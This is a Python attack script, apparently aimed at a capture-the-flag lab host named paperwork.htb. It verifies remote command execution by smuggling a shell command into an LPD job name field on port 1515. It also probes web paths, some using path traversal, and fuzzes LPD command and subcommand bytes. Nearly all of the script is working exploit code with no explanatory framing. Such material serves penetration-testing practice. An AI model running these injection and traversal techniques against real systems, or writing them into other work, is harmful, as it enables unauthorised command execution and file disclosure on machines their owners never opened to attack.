#!/usr/bin/env python3
"""Verify RCE still works + test every possible archive path"""
import socket, time, urllib.request, urllib.error, os

TARGET = '10.129.38.158'

def lpd(jn, timeout=8):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((TARGET, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.2)
        s.recv(1024)
        ct = (f'J{jn}\n').encode()
        s.send(b'\x01' + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.5)
        s.recv(4096)
    except:
        pass
    s.close()

def get_archive():
    req = urllib.request.Request(f'http://{TARGET}/download/archive', headers={'Host': 'paperwork.htb'})
    return urllib.request.urlopen(req, timeout=10).read()

MARKER = 'RCE_' + os.urandom(4).hex()
print(f"Marker: {MARKER}", flush=True)

# Step 1: Verify RCE by writing to archive.log, then try to read via web
print("[1] Verify RCE via archive.log...", flush=True)
lpd("';echo " + MARKER + " >> /tmp/archive.log;echo '")
time.sleep(2)

# Check if our marker appears in /download/archive (in case it IS archive.log)
try:
    data = get_archive()
    if MARKER.encode() in data:
        print(f"  *** RCE CONFIRMED! /download/archive IS /tmp/archive.log!", flush=True)
except:
    pass

# Step 2: Try to read archive.log through every possible web path
print("[2] Probe all possible archive paths...", flush=True)
# Try every combination that might map to the archive file
paths = [
    # Direct .zip
    '/download/archive.zip',
    '/archive.zip',
    '/downloads/archive',
    '/downloads/archive.zip',
    '/static/archive',
    '/static/archive.zip',
    '/assets/archive',
    '/assets/archive.zip',
    # Common web roots with 'archive' 
    '/archive',
    '/archive.php',
    '/archive.py',
    # nginx alias tricks
    '/download/archive/',
    '/download//archive',
    # Try the path without extension
    '/download/../archive',
    '/download/..%2farchive',
    # Try with - in name
    '/download/paperwork-archive',
    '/download/paperwork-archive.zip',
    # Try system paths
    '/server.py',
    '/download/server.py',
]
for p in paths:
    req = urllib.request.Request(f'http://{TARGET}{p}', headers={'Host': 'paperwork.htb'})
    try:
        resp = urllib.request.urlopen(req, timeout=4)
        data = resp.read()
        if len(data) > 0:
            print(f"  {p}: HTTP {resp.status} ({len(data)}b) {data[:50]}", flush=True)
            if MARKER.encode() in data:
                print(f"  *** MARKER FOUND!", flush=True)
    except urllib.error.HTTPError as e:
        if e.code not in (404, 400):
            print(f"  {p}: HTTP {e.code}", flush=True)
    except Exception as e:
        if 'timeout' not in str(e).lower():
            print(f"  {p}: {type(e).__name__}", flush=True)

# Step 3: LPD protocol fuzzing - try different command bytes
print("[3] LPD protocol fuzzing (non-RCE approaches)...", flush=True)
for cmd_byte in [0, 1, 5, 6, 7, 8, 9, 10]:
    s = socket.socket()
    s.settimeout(3)
    try:
        s.connect((TARGET, 1515))
        s.send(bytes([cmd_byte]) + b'test')
        time.sleep(0.5)
        data = s.recv(1024)
        if data:
            print(f"  Cmd 0x{cmd_byte:02x}: response {data[:100]}", flush=True)
    except:
        pass
    s.close()

# Step 4: Try ALL LPD control file commands in subcommand
print("[4] LPD subcommand fuzzing...", flush=True)
for sc in [0, 1, 2, 3, 4, 5]:
    s = socket.socket()
    s.settimeout(5)
    try:
        s.connect((TARGET, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.3)
        s.recv(1024)
        ct = b'Jtest_' + bytes([sc]) + b'\n'
        s.send(bytes([sc]) + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.5)
        data = s.recv(4096)
        print(f"  Subcmd 0x{sc:02x}: response {data[:100]}", flush=True)
    except:
        print(f"  Subcmd 0x{sc:02x}: error", flush=True)
    s.close()

print("DONE", flush=True)
